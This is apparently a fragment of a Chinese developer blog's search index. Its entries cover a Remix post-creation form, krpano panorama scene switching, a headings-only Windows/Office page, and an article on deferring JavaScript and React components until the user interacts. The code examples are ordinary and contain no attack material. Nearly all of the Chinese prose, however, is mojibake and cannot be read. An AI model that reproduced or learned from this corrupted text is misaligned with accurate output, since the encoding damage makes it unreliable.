method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label\u0026gt;\rPost Title:{\u0026#34; \u0026#34;}\r{errors?.title \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Title is required\u0026lt;/em\u0026gt;}\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label\u0026gt;\rPost Slug:{\u0026#34; \u0026#34;}\r{errors?.slug \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Slug is required\u0026lt;/em\u0026gt;}\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;slug\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label htmlFor=\u0026#34;markdown\u0026#34;\u0026gt;Markdown:\u0026lt;/label\u0026gt;{\u0026#34; \u0026#34;}\r{errors?.markdown \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Markdown is required\u0026lt;/em\u0026gt;}\r\u0026lt;br /\u0026gt;\r\u0026lt;textarea id=\u0026#34;markdown\u0026#34; rows={20} name=\u0026#34;markdown\u0026#34; /\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;\r{transition.submission\r? \u0026#34;Creating...\u0026#34;\r: \u0026#34;Create Post\u0026#34;}\r\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;/Form\u0026gt;\r);\r} ","description":"","id":86,"section":"react","tags":null,"title":"Remix åŸºç¡€","uri":"https://codthing.github.io/react/remix/remix-base/"},{"content":"Spritespin å›¾ç‰‡æ’åº åœ¨ç”¨æ•°å­—æ ‡å¿—å›¾ç‰‡åç§°çš„æ—¶å€™ï¼Œå›¾ç‰‡çš„æ—‹è½¬é¡ºåºåº”è¯¥ä¸ºé€†æ—¶é’ˆï¼Œè¿™æ ·åœ¨ç”¨é¼ æ ‡æ‹–æ‹½çš„æ—¶å€™æ‰èƒ½æŒ‰ç…§é¼ æ ‡æ‹–æ‹½çš„æ–¹å‘æ—‹è½¬ã€‚ å¦åˆ™ï¼Œå›¾ç‰‡æ—‹è½¬æ–¹å‘çœ‹èµ·æ¥å°±æ˜¯åæ–¹å‘ã€‚\nkrpanoåœºæ™¯åˆ‡æ¢ Step1. å°†å·¥å…·åˆ‡å¥½çš„å†…é¥°ä½ç½®å›¾ç‰‡æ–‡ä»¶å¤¹æœ‰åºåœ°æ”¾å…¥é¡¹ç›®panosæ–‡ä»¶å¤¹ä¸­\n ä¾‹å¦‚ï¼š 0.tiles 1.tiles 2.tiles\n Step2. åœ¨tour.xmlæ–‡ä»¶ä¸­ç¼–è¾‘åœºæ™¯å’Œçƒ­ç‚¹çš„ä¿¡æ¯\nStep3. é€šè¿‡é…ç½®tour.xmlä¸­çš„sceneå’Œskin/njtvtourskin.xmlä¸­çš„\u0026lt;skin_settingsæ¥åˆ‡æ¢ä¸åŒçš„å†…é¥°åœºæ™¯å’Œå…¶ä»–å¯é€‰é¡¹ \n å‚è€ƒ\n æ³¨æ„ï¼štour.xmlä¸­çš„ï¼š\n\u0026lt;image\u0026gt;\r\u0026lt;cube url=\u0026#34;panos/1.tiles/%s/l%l/%v/l%l_%s_%v_%h.jpg\u0026#34; multires=\u0026#34;512,1024,2048\u0026#34; /\u0026gt;\r\u0026lt;/image\u0026gt;\r`multires` ä¸­çš„å€¼å¿…é¡»æ›¿æ¢ä¸ºå·¥å…·åˆ‡å¥½çš„å®é™…æ•°å€¼ï¼Œè¿™æ ·æ‰èƒ½æ­£å¸¸æ˜¾ç¤º ","description":"","id":87,"section":"react-native","tags":null,"title":"Spritespin.js \u0026 krpano ","uri":"https://codthing.github.io/react-native/expo/spritespin-krpano/"},{"content":"  æ“ä½œç³»ç»Ÿ\n  ç³»ç»Ÿæ¿€æ´»\n  Officeæ¿€æ´»\n  Uç›˜ç³»ç»Ÿå®‰è£…ï¼š\n","description":"","id":88,"section":"others","tags":null,"title":"Win + Office","uri":"https://codthing.github.io/others/windows/win-office/"},{"content":"é¡µé¢å¯èƒ½åŒ…å«å¹¶éç«‹å³éœ€è¦çš„ç»„ä»¶æˆ–èµ„æºçš„ä»£ç æˆ–æ•°æ®ã€‚\nä¾‹å¦‚ï¼Œç”¨æˆ·ä¸ä¼šçœ‹åˆ°éƒ¨åˆ†ç”¨æˆ·ç•Œé¢ï¼Œé™¤éä»–ä»¬å•å‡»æˆ–æ»šåŠ¨é¡µé¢çš„æŸäº›éƒ¨åˆ†ã€‚\nè¿™é€‚ç”¨äºç¼–å†™çš„å¤šç§ç¬¬ä¸€æ–¹ä»£ç ï¼Œä½†è¿™ä¹Ÿé€‚ç”¨äºç¬¬ä¸‰æ–¹å°éƒ¨ä»¶ï¼Œ\nä¾‹å¦‚è§†é¢‘æ’­æ”¾å™¨æˆ–èŠå¤©å°éƒ¨ä»¶ï¼Œé€šå¸¸éœ€è¦å•å‡»æŒ‰é’®æ¥æ˜¾ç¤ºä¸»ç•Œé¢ã€‚\næ€¥åˆ‡åœ°ï¼ˆå³ç«‹å³ï¼‰åŠ è½½è¿™äº›èµ„æºå¯èƒ½ä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼Œå¦‚æœå®ƒä»¬ä»£ä»·é«˜æ˜‚ï¼Œå°±ä¼šæ¨è¿Ÿç”¨æˆ·ä¸é¡µé¢æ›´å…³é”®éƒ¨åˆ†äº¤äº’çš„æ—¶é—´ã€‚\nè¿™ä¼šå½±å“äº¤äº’å‡†å¤‡æŒ‡æ ‡ï¼Œä¾‹å¦‚é¦–æ¬¡è¾“å…¥å»¶è¿Ÿã€æ€»é˜»å¡æ—¶é—´å’Œäº¤äº’æ—¶é—´ã€‚ å¯ä»¥åœ¨æ›´åˆé€‚çš„æ—¶é—´åŠ è½½å®ƒä»¬ï¼Œè€Œä¸æ˜¯ç«‹å³åŠ è½½è¿™äº›èµ„æºï¼Œä¾‹å¦‚ï¼š\n  å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç‚¹å‡»ä¸è¯¥ç»„ä»¶äº¤äº’æ—¶\n  å°†ç»„ä»¶æ»šåŠ¨åˆ°è§†å›¾ä¸­\n  æˆ–æ¨è¿ŸåŠ è½½è¯¥ç»„ä»¶ï¼Œç›´åˆ°æµè§ˆå™¨ç©ºé—²ï¼ˆé€šè¿‡ requestIdleCallbackï¼‰\n  åŠ è½½èµ„æºçš„ä¸åŒæ–¹æ³•æ˜¯ï¼Œåœ¨è¾ƒé«˜çº§åˆ«ï¼š\n  Eager - ç«‹å³åŠ è½½èµ„æºï¼ˆåŠ è½½è„šæœ¬çš„æ­£å¸¸æ–¹å¼ï¼‰\n  Lazyï¼ˆRoute-basedï¼‰ - å½“ç”¨æˆ·å¯¼èˆªåˆ°è·¯ç”±æˆ–ç»„ä»¶æ—¶åŠ è½½\n  Lazyï¼ˆäº¤äº’æ—¶ï¼‰ - å½“ç”¨æˆ·ç‚¹å‡» UI æ—¶åŠ è½½ï¼ˆä¾‹å¦‚æ˜¾ç¤ºèŠå¤©ï¼‰\n  Lazy (In viewport) - å½“ç”¨æˆ·å‘ç»„ä»¶æ»šåŠ¨æ—¶åŠ è½½\n  é¢„å– - åœ¨éœ€è¦ä¹‹å‰åŠ è½½ï¼Œä½†åœ¨åŠ è½½å…³é”®èµ„æºä¹‹å\n  é¢„åŠ è½½ - æ€¥åˆ‡åœ°ï¼Œå…·æœ‰æ›´é«˜çš„ç´§è¿«æ€§\n  æ³¨æ„ï¼š\nåªæœ‰åœ¨äº¤äº’ä¹‹å‰æ— æ³•é¢„å–èµ„æºæ—¶ï¼Œæ‰åº”æ‰§è¡Œç¬¬ä¸€éƒ¨åˆ†ä»£ç çš„äº¤äº’æ—¶å¯¼å…¥ã€‚\nç„¶è€Œï¼Œè¯¥æ¨¡å¼ä¸ç¬¬ä¸‰æ–¹ä»£ç éå¸¸ç›¸å…³ï¼Œå¦‚æœä¸é‡è¦ï¼Œé€šå¸¸å¸Œæœ›å°†å…¶æ¨è¿Ÿåˆ°ä»¥åçš„æ—¶é—´ç‚¹ã€‚\nè¿™å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å®ç°ï¼ˆæ¨è¿Ÿåˆ°äº¤äº’ï¼Œç›´åˆ°æµè§ˆå™¨ç©ºé—²æˆ–ä½¿ç”¨å…¶ä»–å¯å‘å¼æ–¹æ³•ï¼‰ã€‚\nåœ¨äº¤äº’ä¸­å»¶è¿Ÿå¯¼å…¥åŠŸèƒ½ä»£ç æ˜¯æœ¬æ–‡ä¸­ä»‹ç»çš„è®¸å¤šä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨çš„æ¨¡å¼ã€‚\nä¹‹å‰å¯èƒ½ä½¿ç”¨è¿‡çš„ Google Docsï¼Œå®ƒé€šè¿‡å°†å…¶åŠ è½½æ¨è¿Ÿåˆ°ç”¨æˆ·äº¤äº’ï¼Œå¯ä»¥ä¸ºå…±äº«åŠŸèƒ½èŠ‚çœ 500KB çš„è„šæœ¬åŠ è½½ã€‚\nå¦ä¸€ä¸ªé€‚åˆäº¤äº’å¯¼å…¥çš„åœ°æ–¹æ˜¯åŠ è½½ç¬¬ä¸‰æ–¹å°éƒ¨ä»¶ã€‚\n\râ€œFakeâ€ åŠ è½½å¸¦æœ‰å¤–è§‚çš„ç¬¬ä¸‰æ–¹ UI æ­£åœ¨å¯¼å…¥ç¬¬ä¸‰æ–¹è„šæœ¬ï¼Œå¹¶ä¸”å¯¹å…¶å‘ˆç°çš„å†…å®¹æˆ–åŠ è½½ä»£ç çš„æ—¶é—´çš„æ§åˆ¶è¾ƒå°‘ã€‚\nå®ç°äº¤äº’åŠ è½½çš„ä¸€ç§é€‰æ‹©æ˜¯ç›´æˆªäº†å½“çš„ï¼šä½¿ç”¨ facadeï¼ˆå¤–è§‚ï¼‰ã€‚\nå¤–è§‚æ˜¯ä¸€ä¸ªç®€å•çš„ é¢„è§ˆ æˆ– å ä½ç¬¦ï¼Œç”¨äºæ¨¡æ‹ŸåŸºæœ¬ä½“éªŒçš„æˆæœ¬æ›´é«˜çš„ç»„ä»¶ï¼Œä¾‹å¦‚å›¾åƒæˆ–å±å¹•æˆªå›¾ã€‚\nè¿™æ˜¯åœ¨ Lighthouse å›¢é˜Ÿä¸­ä¸€ç›´ç”¨äºè¿™ä¸ªæƒ³æ³•çš„æœ¯è¯­ã€‚\nå½“ç”¨æˆ·å•å‡» é¢„è§ˆï¼ˆpreviewï¼‰æ—¶ï¼Œå°†åŠ è½½èµ„æºçš„ä»£ç ã€‚\nè¿™é™åˆ¶äº†ç”¨æˆ·åœ¨ä¸æ‰“ç®—ä½¿ç”¨æŸä¸ªåŠŸèƒ½æ—¶éœ€è¦ä¸ºè¯¥åŠŸèƒ½æ”¯ä»˜ä½“éªŒè´¹ç”¨ã€‚\nåŒæ ·ï¼Œå¤–è§‚å¯ä»¥åœ¨æ‚¬åœæ—¶é¢„è¿æ¥åˆ°å¿…è¦çš„èµ„æºã€‚\næ³¨æ„ï¼š\nç¬¬ä¸‰æ–¹èµ„æºç»å¸¸è¢«æ·»åŠ åˆ°é¡µé¢ä¸­ï¼Œè€Œæ²¡æœ‰å……åˆ†è€ƒè™‘å®ƒä»¬å¦‚ä½•é€‚åº”ç½‘ç«™çš„æ•´ä½“åŠ è½½ã€‚\nåŒæ­¥åŠ è½½çš„ç¬¬ä¸‰æ–¹è„šæœ¬ä¼šé˜»æ­¢æµè§ˆå™¨è§£æå™¨å¹¶å»¶è¿Ÿæ°´åˆã€‚\nå¦‚æœå¯èƒ½ï¼Œåº”è¯¥ä½¿ç”¨ async/deferï¼ˆæˆ–å…¶ä»–æ–¹æ³•ï¼‰åŠ è½½ 3P è„šæœ¬ï¼Œä»¥ç¡®ä¿ 1P è„šæœ¬ä¸ä¼šç¼ºä¹ç½‘ç»œå¸¦å®½ã€‚\né™¤éå®ƒä»¬å¾ˆå…³é”®ï¼Œå¦åˆ™å®ƒä»¬å¯ä»¥æˆä¸ºä½¿ç”¨äº¤äº’å¯¼å…¥ç­‰æ¨¡å¼è½¬ç§»åˆ°å»¶è¿ŸåŠ è½½çš„è‰¯å¥½å€™é€‰è€…ã€‚\n\rè§†é¢‘æ’­æ”¾å™¨åµŒå…¥ â€œå¤–è§‚â€çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯ç”± Paul Irish åµŒå…¥çš„ YouTube Liteã€‚\nè¿™æä¾›äº†ä¸€ä¸ªè‡ªå®šä¹‰å…ƒç´ ï¼Œå®ƒé‡‡ç”¨ YouTube è§†é¢‘ ID å¹¶å‘ˆç°æœ€å°çš„ç¼©ç•¥å›¾å’Œæ’­æ”¾æŒ‰é’®ã€‚\nå•å‡»è¯¥å…ƒç´ ä¼šåŠ¨æ€åŠ è½½å®Œæ•´çš„ YouTube åµŒå…¥ä»£ç ï¼Œè¿™æ„å‘³ç€ä»ä¸å•å‡»æ’­æ”¾çš„ç”¨æˆ·æ— éœ€æ”¯ä»˜è·å–å’Œå¤„ç†å®ƒçš„è´¹ç”¨ã€‚\nä¸€äº› Google ç½‘ç«™çš„ç”Ÿäº§ä¸­ä½¿ç”¨äº†ç±»ä¼¼çš„æŠ€æœ¯ã€‚\nåœ¨ Android.com ä¸Šï¼Œä¸æ˜¯æ€¥åˆ‡åœ°åŠ è½½åµŒå…¥çš„ YouTube è§†é¢‘æ’­æ”¾å™¨ï¼Œè€Œæ˜¯å‘ç”¨æˆ·æ˜¾ç¤ºå¸¦æœ‰å‡æ’­æ”¾å™¨æŒ‰é’®çš„ç¼©ç•¥å›¾ã€‚\nå½“ä»–ä»¬ç‚¹å‡»å®ƒæ—¶ï¼Œä¼šåŠ è½½ä¸€ä¸ªæ¨¡å¼ï¼Œå®ƒä½¿ç”¨åµŒå…¥çš„å…¨è„‚ YouTube è§†é¢‘æ’­æ”¾å™¨è‡ªåŠ¨æ’­æ”¾è§†é¢‘ï¼š\n\réªŒè¯ åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦é€šè¿‡å®¢æˆ·ç«¯ JavaScript SDK æ”¯æŒæœåŠ¡èº«ä»½éªŒè¯ã€‚\nè¿™äº›æœ‰æ—¶ä¼šå¾ˆå¤§ï¼Œå¹¶ä¸” JS æ‰§è¡Œæˆæœ¬å¾ˆé«˜ï¼Œå¦‚æœç”¨æˆ·ä¸æ‰“ç®—ç™»å½•ï¼Œäººä»¬å¯èƒ½å®æ„¿ä¸æ€¥åˆ‡åœ°é¢„å…ˆåŠ è½½å®ƒä»¬ã€‚\nç›¸åï¼Œå½“ç”¨æˆ·å•å‡»â€œç™»å½•â€æŒ‰é’®æ—¶åŠ¨æ€å¯¼å…¥èº«ä»½éªŒè¯åº“ï¼Œä»è€Œåœ¨åˆå§‹åŠ è½½æœŸé—´ä¿æŒä¸»çº¿ç¨‹æ›´ç©ºé—²ã€‚\n\rèŠå¤©å°å·¥å…· é€šè¿‡ä½¿ç”¨ç±»ä¼¼çš„å¤–è§‚æ–¹æ³•ï¼ŒCalibre åº”ç”¨ç¨‹åºå°†å…¶åŸºäº Intercom çš„å®æ—¶èŠå¤©çš„æ€§èƒ½æé«˜äº† 30%ã€‚\nä»–ä»¬ä»…ä½¿ç”¨ CSS å’Œ HTML å°±å®ç°äº†ä¸€ä¸ªâ€œå‡â€å¿«é€ŸåŠ è½½å®æ—¶èŠå¤©æŒ‰é’®ï¼Œç‚¹å‡»åä¼šåŠ è½½ä»–ä»¬çš„ Intercom åŒ…ã€‚\nPostmark æŒ‡å‡ºï¼Œä»–ä»¬çš„â€œå¸®åŠ©â€èŠå¤©å°éƒ¨ä»¶æ€»æ˜¯æ€¥åˆ‡åœ°åŠ è½½ï¼Œå³ä½¿å®¢æˆ·åªæ˜¯å¶å°”ä½¿ç”¨å®ƒã€‚\nè¯¥å°éƒ¨ä»¶å°†æ‹‰å…¥ 314KB çš„è„šæœ¬ï¼Œè¶…è¿‡å…¶æ•´ä¸ªä¸»é¡µã€‚\nä¸ºäº†æ”¹å–„ç”¨æˆ·ä½“éªŒï¼Œä»–ä»¬ä½¿ç”¨ HTML å’Œ CSS ç”¨ä¼ªé€ çš„å‰¯æœ¬æ›¿æ¢äº†å°éƒ¨ä»¶ï¼Œåœ¨ç‚¹å‡»æ—¶åŠ è½½çœŸå®çš„ä¸œè¥¿ã€‚\næ­¤æ›´æ”¹å°†äº¤äº’æ—¶é—´ä» 7.7 ç§’å‡å°‘åˆ° 3.7 ç§’ã€‚\n\rå…¶ä»– å½“ç”¨æˆ·ç‚¹å‡»â€œæ»šåŠ¨åˆ°é¡¶éƒ¨â€æŒ‰é’®æ—¶ï¼ŒNe-digital ä½¿ç”¨ä¸€ä¸ª React åº“æ¥åŠ¨ç”»æ»šåŠ¨å›åˆ°é¡µé¢é¡¶éƒ¨ã€‚\nä»–ä»¬ä¸æ˜¯æ€¥åˆ‡åœ°ä¸ºæ­¤åŠ è½½ react-scroll ä¾èµ–é¡¹ï¼Œè€Œæ˜¯åœ¨ä¸æŒ‰é’®äº¤äº’æ—¶åŠ è½½å®ƒï¼ŒèŠ‚çœäº†å¤§çº¦ 7KBï¼š\nhandleScrollToTop() {\rimport(\u0026#39;react-scroll\u0026#39;).then(scroll =\u0026gt; {\rscroll.animateScroll.scrollToTop({\r})\r})\r} \rå¦‚ä½•å¯¼å…¥äº¤äº’ï¼Ÿ Vanilla JavaScript åœ¨ JavaScript ä¸­ï¼Œ\nåŠ¨æ€ import() å¯ç”¨å»¶è¿ŸåŠ è½½æ¨¡å—å¹¶è¿”å›æ‰¿è¯ºï¼Œå¹¶ä¸”åœ¨æ­£ç¡®åº”ç”¨æ—¶å¯ä»¥éå¸¸å¼ºå¤§ã€‚\nä¸‹é¢æ˜¯åœ¨æŒ‰é’®äº‹ä»¶ä¾¦å¬å™¨ä¸­ä½¿ç”¨åŠ¨æ€å¯¼å…¥æ¥å¯¼å…¥ lodash.sortby æ¨¡å—ç„¶åä½¿ç”¨å®ƒçš„ç¤ºä¾‹ã€‚\n1 2 3 4 5 6 7 8 9 10  const btn = document.querySelector(\u0026#39;button\u0026#39;); btn.addEventListener(\u0026#39;click\u0026#39;, e =\u0026gt; { e.preventDefault(); import(\u0026#39;lodash.sortby\u0026#39;) .then(module =\u0026gt; module.default) .then(sortInput()) // ä½¿ç”¨å¯¼å…¥çš„ä¾èµ–  .catch(err =\u0026gt; { console.log(err) }); });   åœ¨åŠ¨æ€å¯¼å…¥æˆ–ç”¨ä¾‹ä¹‹å‰ï¼Œå®ƒä¹Ÿä¸é€‚åˆï¼Œ\nä½¿ç”¨åŸºäº Promise çš„è„šæœ¬åŠ è½½å™¨å°†è„šæœ¬åŠ¨æ€æ³¨å…¥é¡µé¢ä¹Ÿæ˜¯ä¸€ç§é€‰æ‹©è¯·å‚é˜…æ­¤å¤„äº†è§£æ¼”ç¤ºç™»å½•å¤–è§‚çš„å®Œæ•´å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11  const loginBtn = document.querySelector(\u0026#39;#login\u0026#39;); loginBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { const loader = new scriptLoader(); loader.load([ \u0026#39;//apis.google.com/js/client:platform.js?onload=showLoginScreen\u0026#39; ]).then(({length}) =\u0026gt; { console.log(`${length}scripts loaded!`); }); });   1 2 3 4 5 6 7 8 9 10 11  const loginBtn = document.querySelector(\u0026#39;#login\u0026#39;); loginBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { const loader = new scriptLoader(); loader.load([ \u0026#39;//apis.google.com/js/client:platform.js?onload=showLoginScreen\u0026#39; ]).then(({length}) =\u0026gt; { console.log(`${length}scripts loaded!`); }); });   \rReact å‡è®¾æœ‰ä¸€ä¸ªèŠå¤©åº”ç”¨ç¨‹åºï¼Œ\nå®ƒæœ‰ä¸€ä¸ª \u0026lt;MessageList\u0026gt;ã€\u0026lt;MessageInput\u0026gt; å’Œä¸€ä¸ª \u0026lt;EmojiPicker\u0026gt; ç»„ä»¶ï¼ˆç”± emoji-mart æä¾›æ”¯æŒï¼Œå®ƒè¢«å‹ç¼©å’Œå‹ç¼©ä¸º 98KBï¼‰ã€‚\nåœ¨åˆå§‹é¡µé¢åŠ è½½æ—¶æ€¥åˆ‡åŠ è½½æ‰€æœ‰è¿™äº›ç»„ä»¶æ˜¯å¾ˆå¸¸è§çš„ã€‚\nimport MessageList from \u0026#39;./MessageList\u0026#39;;\rimport MessageInput from \u0026#39;./MessageInput\u0026#39;;\rimport EmojiPicker from \u0026#39;./EmojiPicker\u0026#39;;\rconst Channel = () =\u0026gt; {\r...\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;MessageList /\u0026gt;\r\u0026lt;MessageInput /\u0026gt;\r{emojiPickerOpen \u0026amp;\u0026amp; \u0026lt;EmojiPicker /\u0026gt;}\r\u0026lt;/div\u0026gt;\r);\r}; ä½¿ç”¨ä»£ç æ‹†åˆ†æ¥åˆ†è§£è¿™é¡¹å·¥ä½œçš„åŠ è½½ç›¸å¯¹ç®€å•ã€‚\nReact.lazy æ–¹æ³•å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨åŠ¨æ€å¯¼å…¥åœ¨ç»„ä»¶çº§åˆ«å¯¹ React åº”ç”¨ç¨‹åºè¿›è¡Œä»£ç æ‹†åˆ†ã€‚\nReact.lazy å‡½æ•°æä¾›äº†ä¸€ç§å†…ç½®æ–¹æ³•ï¼Œå¯ä»¥å°†åº”ç”¨ç¨‹åºä¸­çš„ç»„ä»¶åˆ†ç¦»ä¸ºå•ç‹¬çš„ JavaScript å—ï¼Œè€Œä¸”å·¥ä½œé‡å¾ˆå°‘ã€‚\nå½“å°†å®ƒä¸ Suspense ç»„ä»¶ç»“åˆæ—¶ï¼Œä½ å¯ä»¥å¤„ç†åŠ è½½çŠ¶æ€ã€‚\n\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import React, { lazy, Suspense } from \u0026#39;react\u0026#39;; import MessageList from \u0026#39;./MessageList\u0026#39;; import MessageInput from \u0026#39;./MessageInput\u0026#39;; const EmojiPicker = lazy( () =\u0026gt; import(\u0026#39;./EmojiPicker\u0026#39;) ); const Channel = () =\u0026gt; { ... return ( \u0026lt;div\u0026gt; \u0026lt;MessageList /\u0026gt; \u0026lt;MessageInput /\u0026gt; {emojiPickerOpen \u0026amp;\u0026amp; ( \u0026lt;Suspense fallback={\u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;}\u0026gt; \u0026lt;EmojiPicker /\u0026gt; \u0026lt;/Suspense\u0026gt; )} \u0026lt;/div\u0026gt; ); };   å¯ä»¥å°†è¿™ä¸ªæƒ³æ³•æ‰©å±•ä¸ºä»…åœ¨ \u0026lt;MessageInput\u0026gt; ä¸­å•å‡» Emoji å›¾æ ‡æ—¶ä¸º Emoji Picker ç»„ä»¶å¯¼å…¥ä»£ç ï¼Œè€Œä¸æ˜¯åœ¨åº”ç”¨ç¨‹åºæœ€åˆåŠ è½½æ—¶ç«‹å³æ‰§è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import React, { useState, createElement } from \u0026#39;react\u0026#39;; import MessageList from \u0026#39;./MessageList\u0026#39;; import MessageInput from \u0026#39;./MessageInput\u0026#39;; import ErrorBoundary from \u0026#39;./ErrorBoundary\u0026#39;; const Channel = () =\u0026gt; { const [emojiPickerEl, setEmojiPickerEl] = useState(null); const openEmojiPicker = () =\u0026gt; { import(/* webpackChunkName: \u0026#34;emoji-picker\u0026#34; */ \u0026#39;./EmojiPicker\u0026#39;) .then(module =\u0026gt; module.default) .then(emojiPicker =\u0026gt; { setEmojiPickerEl(createElement(emojiPicker)); }); }; const closeEmojiPickerHandler = () =\u0026gt; { setEmojiPickerEl(null); }; return ( \u0026lt;ErrorBoundary\u0026gt; \u0026lt;div\u0026gt; \u0026lt;MessageList /\u0026gt; \u0026lt;MessageInput onClick={openEmojiPicker} /\u0026gt; {emojiPickerEl} \u0026lt;/div\u0026gt; \u0026lt;/ErrorBoundary\u0026gt; ); };   \rç¬¬ä¸€éƒ¨åˆ†ä»£ç çš„äº¤äº’å¯¼å…¥ä½œä¸ºæ¸è¿›åŠ è½½çš„ä¸€éƒ¨åˆ† åœ¨äº¤äº’ä¸­åŠ è½½ä»£ç ä¹Ÿæ°å¥½æ˜¯è°·æ­Œå¦‚ä½•åœ¨èˆªç­å’Œç…§ç‰‡ç­‰å¤§å‹åº”ç”¨ç¨‹åºä¸­å¤„ç†æ¸è¿›å¼åŠ è½½çš„å…³é”®éƒ¨åˆ†ã€‚\nä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œçœ‹ä¸€ä¸‹ä¸€ä¸ªä¾‹å­ã€‚\nå‡è®¾ç”¨æˆ·è®¡åˆ’å»å°åº¦å­Ÿä¹°æ—…è¡Œï¼Œä»–ä»¬è®¿é—® Google Hotels æŸ¥çœ‹ä»·æ ¼ã€‚ æ­¤äº¤äº’æ‰€éœ€çš„æ‰€æœ‰èµ„æºéƒ½å¯ä»¥é¢„å…ˆåŠ è½½ï¼Œä½†å¦‚æœç”¨æˆ·æœªé€‰æ‹©ä»»ä½•ç›®çš„åœ°ï¼Œåˆ™åœ°å›¾æ‰€éœ€çš„ HTML/CSS/JS å°†æ˜¯ä¸å¿…è¦çš„ã€‚\nåœ¨æœ€ç®€å•çš„ä¸‹è½½åœºæ™¯ä¸­ï¼Œå‡è®¾ Google Hotels æ­£åœ¨ä½¿ç”¨ç®€å•çš„å®¢æˆ·ç«¯æ¸²æŸ“ (CSR)ã€‚\næ‰€æœ‰ä»£ç éƒ½å°†è¢«é¢„å…ˆä¸‹è½½å’Œå¤„ç†ï¼šHTMLï¼Œç„¶åæ˜¯ JSã€CSSï¼Œç„¶åè·å–æ•°æ®ï¼Œåªæœ‰åœ¨æ‹¥æœ‰æ‰€æœ‰å†…å®¹åæ‰è¿›è¡Œæ¸²æŸ“ã€‚\nç„¶è€Œï¼Œè¿™è®©ç”¨æˆ·ç­‰å¾…å¾ˆé•¿æ—¶é—´ï¼Œå±å¹•ä¸Šæ²¡æœ‰æ˜¾ç¤ºä»»ä½•å†…å®¹ã€‚ å¤§éƒ¨åˆ† JavaScript å’Œ CSS å¯èƒ½æ˜¯ä¸å¿…è¦çš„ã€‚\næ¥ä¸‹æ¥ï¼Œæƒ³è±¡ä¸€ä¸‹å°†è¿™ç§ä½“éªŒè½¬ç§»åˆ°æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) çš„æƒ…å†µã€‚\nå…è®¸ç”¨æˆ·æ›´å¿«åœ°è·å¾—ä¸€ä¸ªè§†è§‰ä¸Šå®Œæ•´çš„é¡µé¢ï¼Œè¿™å¾ˆå¥½ï¼Œä½†æ˜¯ç›´åˆ°ä»æœåŠ¡å™¨è·å–æ•°æ®å¹¶ä¸”å®¢æˆ·ç«¯æ¡†æ¶å®Œæˆæ°´åˆä¹‹å‰å®ƒä¸ä¼šæ˜¯äº¤äº’å¼çš„ã€‚\nSSR å¯ä»¥æ˜¯ä¸€ç§æ”¹è¿›ï¼Œä½†ç”¨æˆ·å¯èƒ½ä¼šæœ‰ä¸€ç§ä¸å¯æ€è®®çš„å±±è°·ä½“éªŒï¼Œé¡µé¢çœ‹èµ·æ¥å·²ç»å‡†å¤‡å¥½äº†ï¼Œä½†ä»–ä»¬æ— æ³•ç‚¹å‡»ä»»ä½•ä¸œè¥¿ã€‚\næœ‰æ—¶è¿™è¢«ç§°ä¸ºæ„¤æ€’ç‚¹å‡»ï¼Œå› ä¸ºç”¨æˆ·å¾€å¾€ä¼šæ²®ä¸§åœ°åå¤ç‚¹å‡»ã€‚\nå›åˆ° Google Hotels æœç´¢ç¤ºä¾‹ï¼Œå¦‚æœç¨å¾®æ”¾å¤§ UIï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“ç”¨æˆ·å•å‡»â€œæ›´å¤šè¿‡æ»¤å™¨â€ä»¥å‡†ç¡®æ‰¾åˆ°åˆé€‚çš„é…’åº—æ—¶ï¼Œä¼šä¸‹è½½è¯¥ç»„ä»¶æ‰€éœ€çš„ä»£ç ã€‚\næœ€åˆåªä¸‹è½½éå¸¸å°‘çš„ä»£ç ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œç”¨æˆ·äº¤äº’å†³å®šäº†ä½•æ—¶å‘é€å“ªäº›ä»£ç ã€‚\nä»”ç»†çœ‹çœ‹è¿™ä¸ªåŠ è½½åœºæ™¯ã€‚\näº¤äº’é©±åŠ¨çš„å»¶è¿ŸåŠ è½½æœ‰è®¸å¤šé‡è¦æ–¹é¢ï¼š\n  é¦–å…ˆï¼Œæœ€åˆä¸‹è½½æœ€å°‘çš„ä»£ç ï¼Œå› æ­¤é¡µé¢åœ¨è§†è§‰ä¸Šå¾ˆå¿«å°±å®Œæˆäº†ã€‚\n  æ¥ä¸‹æ¥ï¼Œå½“ç”¨æˆ·å¼€å§‹ä¸é¡µé¢äº¤äº’æ—¶ï¼Œä½¿ç”¨è¿™äº›äº¤äº’æ¥ç¡®å®šè¦åŠ è½½å“ªäº›å…¶ä»–ä»£ç ã€‚ ä¾‹å¦‚åŠ è½½â€œæ›´å¤šè¿‡æ»¤å™¨â€ç»„ä»¶çš„ä»£ç ã€‚\n  